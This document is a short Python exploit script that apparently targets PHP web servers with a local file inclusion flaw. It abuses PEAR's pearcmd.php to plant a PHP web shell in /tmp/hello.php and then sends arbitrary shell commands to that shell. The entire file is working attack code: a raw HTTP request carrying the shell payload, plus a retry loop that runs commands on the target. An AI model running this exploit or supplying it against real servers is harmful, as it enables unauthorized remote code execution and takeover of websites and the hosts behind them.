import socket
import sys
import requests

# why 502 response????
# use as exp.py ip port path command
# example python -u ".\pearcmd_exp.py" 127.0.0.1 80 lfi.php file "ls /"
# It's a easy exp....Just learn somthing
def rce_exp(ip, port, path, query):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ipp = bytes(ip , encoding = "utf8")
    portt = bytes(port , encoding = "utf8")
    pathh = bytes(path, encoding = "utf-8")
    queryy = bytes(query, encoding = "utf-8")
    p = b'''GET /{path}?+config-create+/&{query}=/usr/local/lib/php/pearcmd.php&/<?=system($_POST[1])?>+/tmp/hello.php HTTP/1.1
Host: {url}:{port}
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
dnt: 1
sec-gpc: 1
Connection: close

'''.replace(b'\n', b'\r\n').replace(b'{url}',ipp).replace(b'{port}',portt).replace(b'{path}',pathh).replace(b'{query}',queryy)
    print(p)
    sock.connect((ipp, (int)(portt)))
    sock.send(p)
    response = b''
    rec = sock.recv(1024)
    while rec:
        response += rec
        rec = sock.recv(1024)
    if "Successfully created default configuration file" in response.decode():
        return True
    else:
        return False

def get_shell(ip,port,path,query,shell_command):
    status_code = 502
    times = 0
    while True:
        try:
            if status_code == 502:
                target_url = f"http://{ip}:{port}/{path}?{query}=/tmp/hello.php"
                dataa = {
                    "1":shell_command
                }
                res = requests.post(target_url,data=dataa)
                print(res.status_code)

                text = res.text
                res_start = text.index("pearcmd.php")+len("pearcmd.php")
                res_end = text.index("pearcmd.php",res_start)
                print(text[res_start:res_end])
                status_code = res.status_code
            else:
                break
        except:
            times = times + 1
        sys.stdout.write("\r now is :{0} times retry ".format(times))
        sys.stdout.flush() 

if __name__ == "__main__":
    try:
        ip = sys.argv[1]
        port = sys.argv[2]
        path = sys.argv[3]
        query = sys.argv[4]
        command = sys.argv[5]
        true_or_not =  rce_exp(ip,port,path,query)
        if true_or_not:
            get_shell(ip,port,path,query,command)
            print("success!!!")
        else:
            print("fail!!!!!!")
    except:
        print("use as exp.py url port path query")
 
